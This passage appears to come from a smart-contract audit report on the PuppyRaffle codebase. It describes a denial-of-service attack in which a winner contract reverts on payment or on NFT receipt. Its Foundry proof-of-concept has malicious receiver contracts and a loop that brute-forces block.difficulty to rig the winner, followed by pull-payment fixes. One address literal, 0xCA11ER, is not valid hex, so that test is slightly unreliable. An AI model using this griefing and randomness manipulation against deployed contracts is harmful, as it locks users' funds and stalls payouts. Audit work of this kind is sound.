3) After raffleDuration elapses, attacker precomputes a block.difficulty (and sets a known timestamp via warp) so that keccak256(abi.encodePacked(caller, ts, diff)) % players.length equals the malicious index.
4) Attacker sets block.timestamp and block.difficulty via cheatcodes and calls selectWinner().
5) Call reverts (either at ETH transfer require or at _safeMint’s receiver hook). Attacker can repeat/grief by front‑running any honest selectWinner attempt with the same tactic.
6) While griefing continues, the round can’t complete; fees can’t be withdrawn; honest users must wait or individually refund.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MaliciousRevertOnReceive {
    receive() external payable { revert("no-thx"); }
}

contract MaliciousERC721Receiver {
    // Accept ETH so payout succeeds, then grief on NFT mint
    receive() external payable {}
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        revert("reject-nft");
    }
}

contract GriefableCallbacksTest is Test {
    PuppyRaffle raffle;
    uint256 entrance = 1 ether;
    address fee = address(0xFEE);
    uint256 duration = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(entrance, fee, duration);
        vm.deal(address(this), 100 ether);
    }

    function _enter4(address a, address b, address c, address d) internal {
        address[] memory arr = new address[](4);
        arr[0] = a; arr[1] = b; arr[2] = c; arr[3] = d;
        raffle.enterRaffle{value: entrance * 4}(arr);
    }

    function _pickDifficulty(address caller, uint256 ts, uint256 playersLen, uint256 wantIdx) internal pure returns (uint256 diff) {
        for (uint256 d = 0; d < 50000; d++) {
            if (uint256(keccak256(abi.encodePacked(caller, ts, d))) % playersLen == wantIdx) {
                return d;
            }
        }
        revert("no-diff-found");
    }

    function test_DoS_on_receive_revert_blocks_selectWinner() public {
        // players: [p1, p2, malicious, p4]
        address p1 = address(0xA1);
        address p2 = address(0xA2);
        MaliciousRevertOnReceive mal = new MaliciousRevertOnReceive();
        address p4 = address(0xA4);
        _enter4(p1, p2, address(mal), p4);

        // Make raffle over
        uint256 ts = block.timestamp + duration + 1;
        vm.warp(ts);

        // Force malicious index (2) to be picked
        address caller = address(0xBEEF);
        uint256 diff = _pickDifficulty(caller, ts, 4, 2);
        vm.difficulty(diff);

        // Expect revert at ETH payout require
        vm.prank(caller);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
    }

    function test_DoS_on_onERC721Received_revert_blocks_selectWinner() public {
        // players: [p1, p2, malicious, p4]
        address p1 = address(0xB1);
        address p2 = address(0xB2);
        MaliciousERC721Receiver mal = new MaliciousERC721Receiver();
        address p4 = address(0xB4);
        _enter4(p1, p2, address(mal), p4);

        // Make raffle over
        uint256 ts = block.timestamp + duration + 1;
        vm.warp(ts);

        // Force malicious index (2) to be picked
        address caller = address(0xCA11ER);
        uint256 diff = _pickDifficulty(caller, ts, 4, 2);
        vm.difficulty(diff);

        // ETH payout succeeds, but _safeMint triggers onERC721Received revert
        vm.prank(caller);
        vm.expectRevert();
        raffle.selectWinner();
    }
}


## Suggested Mitigation
- Use pull-payments for the prize: record prizePool owed to the winner (e.g., prizeOwed[winner] += prizePool) and let the winner claim via a separate withdraw function. Failure to receive cannot block selectWinner.
- Avoid griefable ERC721 receiver hooks during settlement. Options:
  - Mint without the receiver callback: replace _safeMint with _mint in selectWinner; or
  - If winner is a contract (winner.code.length > 0), mint to an escrow or to the winner via _mint, and let the winner later safeTransferFrom/claim the NFT; or
  - Gate safe mints to EOAs only and provide an explicit claim path for contracts.
- Optionally add a nonReentrant guard and events for unsettled prize/NFT claims to improve safety and observability.




